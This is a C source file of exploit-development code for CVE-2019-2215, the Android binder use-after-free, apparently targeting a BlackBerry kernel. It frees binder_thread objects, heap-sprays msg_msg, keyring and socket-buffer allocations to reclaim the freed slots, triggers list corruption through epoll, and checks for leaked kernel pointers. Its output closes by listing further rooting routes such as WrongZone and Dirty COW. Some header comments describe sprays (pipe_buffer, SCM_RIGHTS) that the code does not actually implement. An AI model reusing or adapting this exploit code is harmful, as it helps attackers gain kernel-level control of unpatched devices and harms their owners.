/*
 * binder_uaf_altspray.c - Alternative spray techniques for CVE-2019-2215
 *
 * The iovec spray (readv/writev) fails because BlackBerry's kernel
 * has slab hardening preventing cross-call-site reclaim.
 *
 * This tries alternative spray objects:
 * 1. msg_msg via msgsnd (System V message queues)
 * 2. key_payload via add_key (keyring subsystem)
 * 3. sendmsg ancillary data (SCM_RIGHTS)
 * 4. sk_buff data via sendto (UDP socket)
 * 5. pipe_buffer spray
 *
 * Each uses a different kmalloc call site. If ANY of them can
 * reclaim the freed binder_thread slot, the UAF is exploitable.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_uaf_altspray binder_uaf_altspray.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <linux/keyctl.h>

/* syscall wrappers for add_key/keyctl */
#include <sys/syscall.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

static void force_binder_thread(int fd)
{
    struct binder_write_read bwr;
    char buf[32];
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(buf);
    bwr.read_buffer = (unsigned long)buf;
    ioctl(fd, BINDER_WRITE_READ, &bwr);
}

static int pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

/* binder_thread est. size: ~284 bytes -> kmalloc-512 (257-512 range) */
/* But we don't know the exact slab. Try multiple sizes. */

/*
 * Generic UAF test framework:
 * 1. Free N binder_threads
 * 2. Call spray_func to allocate objects in (hopefully) freed slots
 * 3. Trigger list_del via EPOLL_CTL_DEL
 * 4. Call check_func to see if the spray objects were corrupted
 *
 * Returns: 1=corruption detected, 0=no corruption
 */
typedef int (*spray_fn)(int count, int obj_size, void *ctx);
typedef int (*check_fn)(int count, void *ctx);
typedef void (*cleanup_fn)(void *ctx);

static int generic_uaf_test(
    const char *label,
    int num_binders,
    int num_sprays,
    int spray_size,  /* target kmalloc size for the spray object */
    spray_fn spray,
    check_fn check,
    cleanup_fn cleanup,
    void *ctx,
    int cpu)
{
    int binder_fds[50];
    int epfds[50];
    struct epoll_event event = { .events = EPOLLIN };

    pin_to_cpu(cpu);

    /* Open binder fds with threads + epoll */
    int opened = 0;
    for (int i = 0; i < num_binders && i < 50; i++) {
        binder_fds[i] = open("/dev/binder", O_RDONLY);
        if (binder_fds[i] < 0) break;
        force_binder_thread(binder_fds[i]);
        epfds[i] = epoll_create(1);
        if (epfds[i] < 0) { close(binder_fds[i]); break; }
        if (epoll_ctl(epfds[i], EPOLL_CTL_ADD, binder_fds[i], &event) < 0) {
            close(epfds[i]); close(binder_fds[i]); break;
        }
        opened++;
    }

    if (opened < 2) {
        for (int i = 0; i < opened; i++) { close(epfds[i]); close(binder_fds[i]); }
        return -1;
    }

    /* Free all binder_threads */
    for (int i = 0; i < opened; i++) {
        ioctl(binder_fds[i], BINDER_THREAD_EXIT, NULL);
    }

    /* Spray: allocate objects to reclaim freed slots */
    int sprayed = spray(num_sprays, spray_size, ctx);
    if (sprayed < 0) {
        for (int i = 0; i < opened; i++) { close(epfds[i]); close(binder_fds[i]); }
        return -1;
    }

    /* Trigger list_del on all freed wait queues */
    for (int i = 0; i < opened; i++) {
        epoll_ctl(epfds[i], EPOLL_CTL_DEL, binder_fds[i], &event);
    }

    /* Small delay for list_del to complete */
    usleep(1000);

    /* Check if any spray objects were corrupted */
    int result = check(sprayed, ctx);

    /* Cleanup */
    if (cleanup) cleanup(ctx);
    for (int i = 0; i < opened; i++) {
        close(epfds[i]);
        close(binder_fds[i]);
    }

    return result;
}

/* ============================================================ */
/* Spray 1: msg_msg via System V message queues                 */
/* msg_msg header is 48 bytes, data follows inline up to ~4048B */
/* For kmalloc-512: need 512 - 48 = 464 bytes of data           */
/* For kmalloc-256: need 256 - 48 = 208 bytes of data           */
/* ============================================================ */

struct msgbuf_512 {
    long mtype;
    char mtext[464];  /* 48 header + 464 data = 512 total */
};

struct msgbuf_256 {
    long mtype;
    char mtext[208];  /* 48 header + 208 data = 256 total */
};

struct msg_ctx {
    int qid;
    int count;
    int msg_size;
};

static int msg_spray(int count, int obj_size, void *ctx)
{
    struct msg_ctx *mc = ctx;

    mc->qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (mc->qid < 0) {
        printf("    msgget: %s\n", strerror(errno));
        return -1;
    }

    /* Determine message data size for target slab */
    int data_size;
    if (obj_size <= 256) {
        data_size = 208;  /* kmalloc-256 */
    } else {
        data_size = 464;  /* kmalloc-512 */
    }
    mc->msg_size = data_size;

    struct {
        long mtype;
        char mtext[512];
    } msg;

    mc->count = 0;
    for (int i = 0; i < count; i++) {
        msg.mtype = i + 1;
        /* Fill with pattern to detect corruption */
        memset(msg.mtext, 0x42, data_size);
        /* Write index at start for identification */
        *(int *)msg.mtext = i;

        if (msgsnd(mc->qid, &msg, data_size, IPC_NOWAIT) < 0) {
            if (errno == EAGAIN) break; /* queue full */
            printf("    msgsnd[%d]: %s\n", i, strerror(errno));
            break;
        }
        mc->count++;
    }

    return mc->count;
}

static int msg_check(int count, void *ctx)
{
    struct msg_ctx *mc = ctx;
    int found = 0;

    struct {
        long mtype;
        char mtext[512];
    } msg;

    for (int i = 0; i < mc->count; i++) {
        ssize_t n = msgrcv(mc->qid, &msg, mc->msg_size, i + 1, IPC_NOWAIT);
        if (n < 0) continue;

        /* Check for kernel pointers in the message data */
        uint64_t *p = (uint64_t *)msg.mtext;
        for (int j = 0; j < (int)(n / 8); j++) {
            /* Look for kernel pointers (0xffffffc0...) */
            if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                printf("    [+] KERNEL PTR in msg[%d] offset %d: 0x%016lx\n",
                       i, j * 8, p[j]);
                found = 1;
            }
            /* Also check for modified pattern (list_del wrote here) */
            /* The list_del target is at offset 0x50-0x58 from allocation start.
             * msg_msg header is 48 bytes (0x30), so the target is at
             * mtext offset 0x20-0x28 */
            if (j == 4 || j == 5) { /* offset 0x20 and 0x28 in mtext */
                if (p[j] != 0x4242424242424242ULL) {
                    printf("    [!] msg[%d] offset %d modified: 0x%016lx (was 0x4242...)\n",
                           i, j * 8, p[j]);
                    found = 1;
                }
            }
        }
    }

    return found;
}

static void msg_cleanup(void *ctx)
{
    struct msg_ctx *mc = ctx;
    if (mc->qid >= 0) {
        msgctl(mc->qid, IPC_RMID, NULL);
    }
}

/* ============================================================ */
/* Spray 2: add_key (keyring subsystem)                         */
/* key payload is kmalloc'd with the data size                  */
/* ============================================================ */

struct key_ctx {
    int key_ids[256];
    int count;
};

static int key_spray(int count, int obj_size, void *ctx)
{
    struct key_ctx *kc = ctx;
    kc->count = 0;

    char desc[32];
    char payload[1024];
    memset(payload, 0x43, sizeof(payload));

    /* Payload size for target slab. add_key payload is stored in
     * user_key_payload with 16-byte header + data. */
    int payload_size;
    if (obj_size <= 256) {
        payload_size = 240;  /* 16 + 240 = 256 */
    } else if (obj_size <= 512) {
        payload_size = 496;  /* 16 + 496 = 512 */
    } else {
        payload_size = 1008; /* 16 + 1008 = 1024 */
    }

    for (int i = 0; i < count && i < 256; i++) {
        snprintf(desc, sizeof(desc), "spray_%d_%d", getpid(), i);

        long kid = syscall(__NR_add_key, "user", desc,
                          payload, payload_size,
                          KEY_SPEC_PROCESS_KEYRING);
        if (kid < 0) {
            if (kc->count == 0) {
                printf("    add_key: %s\n", strerror(errno));
            }
            break;
        }
        kc->key_ids[kc->count++] = (int)kid;
    }

    return kc->count;
}

static int key_check(int count, void *ctx)
{
    struct key_ctx *kc = ctx;
    int found = 0;

    char buf[1024];
    for (int i = 0; i < kc->count; i++) {
        long n = syscall(__NR_keyctl, KEYCTL_READ,
                        kc->key_ids[i], buf, sizeof(buf));
        if (n < 0) continue;

        uint64_t *p = (uint64_t *)buf;
        for (int j = 0; j < (int)(n / 8); j++) {
            if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                printf("    [+] KERNEL PTR in key[%d] offset %d: 0x%016lx\n",
                       i, j * 8, p[j]);
                found = 1;
            }
            /* Check for modified pattern at list_del target offsets */
            if (p[j] != 0x4343434343434343ULL &&
                p[j] != 0 &&
                (p[j] & 0xFFFF000000000000ULL) != 0) {
                /* Could be a kernel pointer or modified data */
                if (j >= 4 && j <= 8) { /* around offset 0x20-0x40 */
                    printf("    [!] key[%d] offset %d modified: 0x%016lx\n",
                           i, j * 8, p[j]);
                    found = 1;
                }
            }
        }
    }

    return found;
}

static void key_cleanup(void *ctx)
{
    struct key_ctx *kc = ctx;
    for (int i = 0; i < kc->count; i++) {
        syscall(__NR_keyctl, KEYCTL_INVALIDATE, kc->key_ids[i]);
    }
}

/* ============================================================ */
/* Spray 3: sendmsg with SCM_RIGHTS (file descriptor passing)  */
/* The ancillary data is kmalloc'd                              */
/* ============================================================ */

struct scm_ctx {
    int sockfd[2];
    int count;
};

static int scm_spray(int count, int obj_size, void *ctx)
{
    struct scm_ctx *sc = ctx;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sc->sockfd) < 0) {
        printf("    socketpair: %s\n", strerror(errno));
        return -1;
    }

    /* Make receiver non-blocking */
    fcntl(sc->sockfd[1], F_SETFL, O_NONBLOCK);

    /* Send messages with data sized to target slab.
     * sk_buff data is kmalloc'd at the data size. */
    char data[512];
    memset(data, 0x44, sizeof(data));

    int data_size;
    if (obj_size <= 256) data_size = 200;
    else data_size = 450;

    sc->count = 0;
    for (int i = 0; i < count; i++) {
        struct iovec iov = { .iov_base = data, .iov_len = data_size };
        struct msghdr msg = {0};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        ssize_t sent = sendmsg(sc->sockfd[0], &msg, MSG_DONTWAIT);
        if (sent < 0) {
            if (errno == EAGAIN) break;
            break;
        }
        sc->count++;
    }

    return sc->count;
}

static int scm_check(int count, void *ctx)
{
    struct scm_ctx *sc = ctx;
    int found = 0;

    char buf[512];
    for (int i = 0; i < sc->count; i++) {
        ssize_t n = recv(sc->sockfd[1], buf, sizeof(buf), MSG_DONTWAIT);
        if (n <= 0) break;

        uint64_t *p = (uint64_t *)buf;
        for (int j = 0; j < (int)(n / 8); j++) {
            if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                printf("    [+] KERNEL PTR in skb[%d] offset %d: 0x%016lx\n",
                       i, j * 8, p[j]);
                found = 1;
            }
            if (p[j] != 0x4444444444444444ULL &&
                p[j] != 0 &&
                j >= 2 && j <= 8) {
                printf("    [!] skb[%d] offset %d: 0x%016lx\n",
                       i, j * 8, p[j]);
                found = 1;
            }
        }
    }

    return found;
}

static void scm_cleanup(void *ctx)
{
    struct scm_ctx *sc = ctx;
    close(sc->sockfd[0]);
    close(sc->sockfd[1]);
}

/* ============================================================ */
/* Main test runner                                             */
/* ============================================================ */

int main(void)
{
    printf("=== CVE-2019-2215 Alternative Spray Test ===\n");
    printf("uid=%d pid=%d\n\n", getuid(), getpid());

    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) { printf("[-] /dev/binder: %s\n", strerror(errno)); return 1; }
    close(fd);

    int detected = 0;

    /* ===== Spray 1: msg_msg ===== */
    printf("--- Spray 1: msg_msg (System V message queues) ---\n");
    int sizes[] = { 256, 512, 1024 };
    for (int s = 0; s < 3 && !detected; s++) {
        printf("  Target: kmalloc-%d\n", sizes[s]);
        for (int attempt = 0; attempt < 15 && !detected; attempt++) {
            struct msg_ctx mc = { .qid = -1 };
            int r = generic_uaf_test("msg_msg", 20, 100, sizes[s],
                                     msg_spray, msg_check, msg_cleanup,
                                     &mc, attempt % 6);
            if (r == 1) {
                detected = 1;
                printf("  >>> msg_msg DETECTED at kmalloc-%d!\n", sizes[s]);
            }
        }
    }

    /* ===== Spray 2: add_key ===== */
    if (!detected) {
        printf("\n--- Spray 2: add_key (keyring) ---\n");
        for (int s = 0; s < 3 && !detected; s++) {
            printf("  Target: kmalloc-%d\n", sizes[s]);
            for (int attempt = 0; attempt < 15 && !detected; attempt++) {
                struct key_ctx kc = { .count = 0 };
                int r = generic_uaf_test("add_key", 20, 50, sizes[s],
                                         key_spray, key_check, key_cleanup,
                                         &kc, attempt % 6);
                if (r == 1) {
                    detected = 1;
                    printf("  >>> add_key DETECTED at kmalloc-%d!\n", sizes[s]);
                }
                if (r == -1 && attempt == 0) {
                    printf("  add_key not available, skipping\n");
                    break;
                }
            }
        }
    }

    /* ===== Spray 3: sendmsg/skb ===== */
    if (!detected) {
        printf("\n--- Spray 3: sendmsg (socket buffer) ---\n");
        for (int s = 0; s < 2 && !detected; s++) {
            printf("  Target: kmalloc-%d\n", sizes[s]);
            for (int attempt = 0; attempt < 15 && !detected; attempt++) {
                struct scm_ctx sc = {0};
                int r = generic_uaf_test("sendmsg", 20, 100, sizes[s],
                                         scm_spray, scm_check, scm_cleanup,
                                         &sc, attempt % 6);
                if (r == 1) {
                    detected = 1;
                    printf("  >>> sendmsg DETECTED at kmalloc-%d!\n", sizes[s]);
                }
            }
        }
    }

    /* ===== Summary ===== */
    printf("\n=== RESULT ===\n");
    if (detected) {
        printf("[+] Alternative spray succeeded!\n");
        printf("[+] The UAF IS exploitable with the right spray object.\n");
    } else {
        printf("[-] No alternative spray detected corruption.\n");
        printf("[-] This strongly suggests SLUB hardening in BB kernel.\n");
        printf("[-] The vulnerability EXISTS but cannot be exploited\n");
        printf("    via standard heap spray techniques on this device.\n");
        printf("\n");
        printf("[*] Remaining options:\n");
        printf("    1. CVE-2018-9568 (WrongZone) - sk_clone_lock type confusion\n");
        printf("    2. Dirty COW variant (if kernel < 3.10.93)\n");
        printf("    3. Boot image extraction + offline kernel analysis\n");
        printf("    4. Find a binder-internal spray object\n");
    }

    printf("\n=== DONE ===\n");
    return detected ? 0 : 2;
}
